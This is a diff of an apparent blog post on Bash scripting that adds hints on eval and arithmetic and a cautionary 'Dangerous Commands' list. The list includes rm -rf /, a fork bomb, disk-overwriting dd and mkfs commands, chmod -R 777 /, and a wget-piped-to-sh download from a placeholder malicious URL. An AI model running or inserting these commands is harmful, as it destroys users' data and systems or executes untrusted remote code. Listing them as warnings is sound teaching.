@@ -3,8 +3,8 @@ title: "Bash Programming"
 date: 2022-10-21T23:33:07-03:00
 Description: ""
 Summary: "Exit codes and Basic structures to program scripts."
-Tags: []
-Categories: []
+Tags: [linux, cli, scripting]
+Categories: [bash]
 DisableComments: false
 ---
 
@@ -172,3 +172,61 @@ for endpoint in ${LIST[@]}; do
   echo ${endpoint};
 done
 ```
+
+# Hints
+
+## Define a command in a variable and invoke it with `eval`
+
+```bash
+FILE="data.csv";
+AWK="awk -f script.awk";
+eval "${AWK} ${FILE}";
+```
+
+## Arithmetic Operations
+
+```bash
+#!/bin/bash
+y=5;
+x=10;
+
+echo $((x+y));
+echo $((x-y));
+echo $((x*y));
+echo $((x/y));
+echo $((x%y)); # modulus
+```
+
+Bash treat numbers as integers, this might be a problem in some cases. In this case, use the basic calculator `bc`.
+
+```bash
+echo "scale=2; ${x}/${y}" | bc
+```
+
+Variations:
+
+```bash
+expr ${x} + ${y};
+```
+
+```bash
+let "answer = ${x} + ${y}";
+echo ${answer};
+```
+
+# Dangerous Commands
+
+- `rm -rf /`
+- `command > /dev/sda`
+- `:(){:|:&};:`
+- `> file (cat /dev/null > file)`
+- `^foo^bar`
+- `mv directory /dev/null`
+- `wget http://malicious-source-url -O- | sh`
+- `crontab -r`
+- `history | sh`
+- `dd if=/dev/random of=dev/sda`
+- `mkfs.ext3 /dev/sda`
+- `gunzip untrusted.gz`
+- Remove python: `sudo apt purge python2.x-minimal`
+- `chmod -R 777 /`
